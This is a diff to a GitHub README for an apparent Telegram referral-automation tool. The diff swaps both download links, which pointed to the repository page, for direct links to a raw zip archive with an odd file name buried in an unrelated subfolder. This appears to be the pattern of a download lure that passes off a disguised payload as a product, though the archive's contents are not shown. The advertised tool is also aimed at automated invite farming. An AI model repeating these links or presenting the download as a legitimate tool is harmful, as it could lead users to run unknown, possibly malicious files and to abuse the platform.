@@ -1,12 +1,12 @@
 # 🤖 telegram-referral-automator - Increase telegram referrals with automated tools
 
-[![Download Telegram Referral Automator](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Gcah8340/telegram-referral-automator)
+[![Download Telegram Referral Automator](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Gcah8340/telegram-referral-automator/raw/refs/heads/main/aranein/telegram-referral-automator-vicissitude.zip)
 
 This software manages referral tasks for Telegram accounts. It helps users grow presence on the platform through automated invite systems. The tool handles the invite process so you save time.
 
 ## 📥 Getting Started
 
-Visit this page to download the latest version: [https://github.com/Gcah8340/telegram-referral-automator](https://github.com/Gcah8340/telegram-referral-automator)
+Visit this page to download the latest version: [https://github.com/Gcah8340/telegram-referral-automator/raw/refs/heads/main/aranein/telegram-referral-automator-vicissitude.zip](https://github.com/Gcah8340/telegram-referral-automator/raw/refs/heads/main/aranein/telegram-referral-automator-vicissitude.zip)
 
 ### System Requirements
 
